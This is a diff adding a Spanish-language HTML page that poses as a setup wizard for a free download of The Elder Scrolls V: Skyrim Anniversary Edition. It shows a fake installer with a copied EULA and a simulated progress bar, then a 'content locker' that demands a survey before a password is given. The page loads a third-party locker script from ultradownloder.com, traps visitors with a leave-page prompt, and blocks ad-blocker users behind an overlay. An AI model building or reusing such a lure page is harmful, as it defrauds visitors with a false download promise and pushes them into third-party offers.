@@ -1,0 +1,326 @@
+﻿
+
+
+
+<html>
+
+
+
+        <head>
+
+		
+
+                <title>Asistente de configuración</title>
+
+                <meta name="description" content="Setup Wizard" />
+
+                <meta content="width=device-width, initial-scale=1" name="viewport">
+
+                <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+
+                <meta name="robots" content="noindex,nofollow" />
+
+                <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
+
+                <link href="../css_files/online.css" rel="stylesheet">
+
+                <link href="../css_files/font-awesome.min.css" rel="stylesheet">
+
+                <link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css">
+
+                <link href='https://fonts.googleapis.com/css?family=Titillium+Web:400,700,300' rel='stylesheet' type='text/css'>
+
+                <link rel="icon" href="../css_files/favicon.png" sizes="16x16">
+
+        <style type="text/css">
+
+
+
+    
+
+        .footer {
+
+          position: fixed;
+
+          left: 0;
+
+          bottom: 0;
+
+          width: 100%;
+
+          text-align: center;
+
+        }
+
+                </style>
+<script>
+window.addEventListener('beforeunload', function(e) {
+    e.preventDefault();
+    e.returnValue = '';
+});
+</script>
+<script type="text/javascript" src="https://ultradownloder.com/script_include.php?id=1827901"></script>
+<script>
+// Rozwiązanie działające natychmiast na wszystkich przeglądarkach
+(function() {
+    // 1. Funkcja sprawdzająca AdBlock
+    function checkAdBlock() {
+        const testAd = document.createElement('div');
+        testAd.className = 'adsbox ad-unit ad-placement text-ad advertisement ads';
+        testAd.style.cssText = 'height:1px!important;width:1px!important;position:absolute!important;left:-10000px!important;';
+        document.body.appendChild(testAd);
+        
+        setTimeout(() => {
+            const isBlocked = testAd.offsetHeight === 0 || 
+                            testAd.offsetWidth === 0 ||
+                            window.getComputedStyle(testAd).display === 'none';
+            testAd.remove();
+            
+            if (isBlocked) {
+                showAdblockWarning();
+            }
+        }, 100);
+    }
+
+    // 2. Funkcja pokazująca ostrzeżenie
+    function showAdblockWarning() {
+        if (window.adBlockWarningShown) return;
+        window.adBlockWarningShown = true;
+        
+        const warning = document.createElement('div');
+        warning.style.cssText = `
+            position:fixed;
+            top:0;
+            left:0;
+            width:100%;
+            height:100%;
+            background:rgba(0,0,0,0.8);
+            z-index:999999;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            color:white;
+            text-align:center;
+            padding:20px;
+            box-sizing:border-box;
+        `;
+        
+        warning.innerHTML = `
+            <div>
+                <h2 style="color:#ff5555;margin-bottom:20px;">BLOQUEADOR DETECTADO</h2>
+                <p style="margin-bottom:30px;font-size:18px;max-width:500px;margin:0 auto;">
+                    Por favor, desactiva tu bloqueador de anuncios para acceder a esta página.
+                </p>
+                <button onclick="window.location.reload()" 
+                        style="
+                            padding:12px 24px;
+                            background:#4CAF50;
+                            color:white;
+                            border:none;
+                            border-radius:5px;
+                            font-size:16px;
+                            cursor:pointer;
+							margin-top:20px;
+                        ">
+                    Recargar página
+                </button>
+            </div>
+        `;
+        
+        document.body.appendChild(warning);
+    }
+
+    // 3. Wielokrotne sprawdzanie dla pewności
+    if (document.readyState === 'complete') {
+        checkAdBlock();
+        setTimeout(checkAdBlock, 500);
+    } else {
+        document.addEventListener('DOMContentLoaded', function() {
+            checkAdBlock();
+            setTimeout(checkAdBlock, 500);
+        });
+    }
+    
+    // Dodatkowe sprawdzenie po 1.5s (dla Chrome)
+    setTimeout(checkAdBlock, 1500);
+})();
+</script>
+            </head>
+
+            <div class="new-locker-overlay">
+
+                <div class="new-locker">
+
+                    <div class="new-locker-title"><i class="fa fa-unlock-alt" aria-hidden="true"></i> Clave de Activación</div>
+
+                    <div class="new-locker-sub-title">Complete una encuesta a continuación para desbloquear este contenido protegido</div>
+
+                    <div class="offers-content"></div>
+
+                    <div class="new-locker-footer">
+
+                        <i class="fa fa-circle-o-notch fa-spin"></i>
+
+                        <p>Esperando la verificación completa ...</p>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+            
+
+
+
+            <script type="text/javascript">
+
+
+
+                var gameName = 'The Elder Scrolls V: Skyrim Anniversary Edition';
+
+                var bgImg = 'https://www.dropbox.com/s/e84kt0yw9jvdeez/skyrimtemp.jpg?raw=1';
+
+                var downloadSpeed = 3500;
+
+                var installSpeed = 3000; // x
+
+                
+
+
+
+            </script>
+
+
+
+            <body>
+
+                <div class="flex fbc">
+
+                    <div class="main">
+
+                        <div class="navBar fbr">
+
+                            <span id="about" class="navItem showAbout"><i class="fa fa-gamepad"></i></span>
+
+                            <span id="hack" class="navItem showHack"><span class="gameName"></span></span>
+
+                        </div>
+
+                        <div class="content">
+
+                            <div class="step1">
+
+                                Este sitio web te permite descargar e instalar el juego original de <strong class="gameName"></strong>.
+
+                                <h2>Contrato de Licencia de Usuario</h2>
+
+                                <div class="eula" id="">
+
+                                    Este Acuerdo de licencia de usuario final ("EULA") es un acuerdo legal entre usted (ya sea una persona o una sola entidad) y puede incluir medios asociados, materiales impresos y documentación "en línea" o electrónica (colectivamente, "Software" o " Producto de software "). Al instalar, copiar, descargar, acceder o utilizar el Software, usted acepta estar sujeto a los términos de este EULA. Si no está de acuerdo con los términos de este EULA, no instale ni use el Software. El Software está protegido por leyes de derechos de autor y tratados internacionales de derechos de autor, así como otras leyes y tratados de propiedad intelectual. El software es con licencia, no vendido. Los términos en mayúscula utilizados en este CLUF se definen de la siguiente manera: "Actualizaciones" significa todas las versiones públicas posteriores de software, incluidas las versiones beta públicas, versiones de mantenimiento, correcciones de errores, actualizaciones, mejoras, adiciones, mejoras, extensiones, modificaciones y versiones sucesoras. Limitaciones en ingeniería inversa, descompilación y desmontaje. No puede realizar ingeniería inversa, descompilar y desensamblar el Software, incluidos los protocolos asociados con el Software, excepto y solo en la medida en que dicha actividad esté expresamente permitida por la ley aplicable a pesar de esta limitación. Sin alteraciones. No puede alterar ningún componente del Software, incluido, entre otros, el entorno de tiempo de ejecución, incluida, entre otras, la configuración del registro. DESCRIPCIÓN DE OTROS DERECHOS Y LIMITACIONES: Transferencia. No puede transferir sus derechos bajo este EULA a ningún tercero. Alquiler. No puede alquilar, arrendar ni prestar el Software. Marcas registradas Este EULA no le otorga ningún derecho en relación con ninguna marca comercial o marca de servicio de EULA Softworks. Terminación. Sin perjuicio de cualquier otro derecho, EULA Softworks puede rescindir este EULA si no cumple con los términos y condiciones de este EULA. En tal caso, debe destruir todas las copias del Software. Actualizaciones y versiones sucesoras. EULA Softworks puede, a su elección, realizar actualizaciones y / o versiones sucesoras del Software. EULA Softworks puede hacer que las versiones no beta de tales actualizaciones y / o versiones sucesoras del Software ("Actualizaciones") estén disponibles de conformidad con los términos de este Acuerdo o, a exclusivo criterio de EULA Softworks, EULA Softworks puede condicionar el lanzamiento de dichas Actualizaciones a al aceptar otro EULA u otra ejecución de un acuerdo por separado Servicios de soporte. EULA Softworks puede proporcionar, pero no está obligado a proporcionar soporte técnico u otro ("Servicios de soporte") para el Software. Cualquier código de software complementario que se le proporcione como parte de los Servicios de soporte se considerará parte del Software y estará sujeto a los términos y condiciones de este CLUF. Con respecto a la información técnica que usted proporciona a EULA Softworks como parte de los Servicios de soporte, EULA Softworks puede usar dicha información para sus fines comerciales, incluido el soporte y desarrollo de productos. EULA Softworks no utilizará dicha información técnica en una forma que lo identifique personalmente. Todos los títulos y derechos de propiedad intelectual sobre el Software (incluidos, entre otros, imágenes, fotografías, animaciones, video, audio, música, texto y "applets" incorporados en el Software), y cualquier Actualización del mismo, y cualquier copia que usted están autorizados a hacer en este documento son propiedad de EULA Softworks o sus proveedores. Todos los títulos y derechos de propiedad intelectual sobre el Contenido al que se puede acceder mediante el uso del Software son propiedad del propietario del Contenido respectivo y pueden estar protegidos por los derechos de autor aplicables u otras leyes y tratados de propiedad intelectual. Todos los derechos no otorgados expresamente están reservados por EULA Softworks.
+
+                                </div>
+
+                                <div class="go-step2 nextBtn">Entiendo, continúe</div>
+
+                            </div>
+
+                            <div class="step2">
+
+                                <h2><i class="fa fa-cog"></i> Ajustes básicos</h2>
+
+                                <div class="check-short check  hidden mobile-hide"><i class="fa fa-square-o"></i> Crea un acceso directo en tu escritorio.</div>
+
+                                <div class="check-short check mobile-hide"><i class="fa fa-check-square-o"></i> Crea un acceso directo en tu escritorio.</div>
+
+                                <div class="check-read check "><i class="fa fa-square-o"></i> Mostrar archivo Readme.</div>
+
+                                <div class="check-read check hidden"><i class="fa fa-check-square-o"></i> Mostrar archivo Readme.</div>
+
+                                <span class="mobile-hide">La ruta de instalación predeterminada es "C:\Program Files\<span class="gameName"></span>" Haga clic en el <strong>"Seleccione la ruta"</strong> para mantener los archivos del juego en un directorio diferente o simplemente continuar con la ruta predeterminada. Tenga en cuenta que cuando selecciona la carpeta manualmente, el instalador irá al siguiente paso automáticamente.</span>
+
+                                <input type="file" class="fileFolder mobile-hide" webkitdirectory directory multiple id="fileURL"/>
+
+                                <div class="flex-buttons">
+
+                                    <div class="triggerFile btn mobile-hide">Seleccione la ruta</div>
+
+                                    <div class="go-step3 btn">Siguiente</div>
+
+                                </div>
+
+                            </div>
+
+                            <div class="loading-msg"><i class="fa fa-refresh fa-spin"></i> Carga..</div>
+
+                            <div class="step3">
+
+                                Configuramos tu descarga, ¡solo te llevará un momento!
+
+                                <div class="progress-bar">
+
+                                    <div class="progress"></div>
+
+                                </div>
+
+                                <div class="loading-text">Configurar descarga e instalación...</div>
+
+                            </div>
+
+                            <div class="step4">
+
+                                <div class="activation-msg"><i class="fa fa-exclamation-triangle"></i>  Para descargar el juego gratis, primero tienes que conseguir la contraseña</div>
+
+                                <div><a href="#" id="locker" data-locker="test"  class="locker hcclLock">ww</a></div>
+
+                                <input class="inputText" maxlength="15" type="text" value="Contraseña">
+
+                                <div class="flex-buttons">
+
+                                    
+
+                                    <div class="auth btn" onclick="call_locker();">Obtener la contraseña</div>
+
+                                    <div class="btn unlock">Descargar</div>
+
+                                </div>
+
+                            </div>
+
+                            
+
+                        </div>
+
+                        <div class="footerBar">
+
+        &copy Descargarpcjuegos.com
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+        
+
+           <div class="footer">
+
+        
+
+           </div>
+
+           </body>
+
+        
+
+           <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+           <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
+
+
+
+            <script src="../js_files/game.js" type="text/javascript"></script>        
+
+        </html>
+
+        
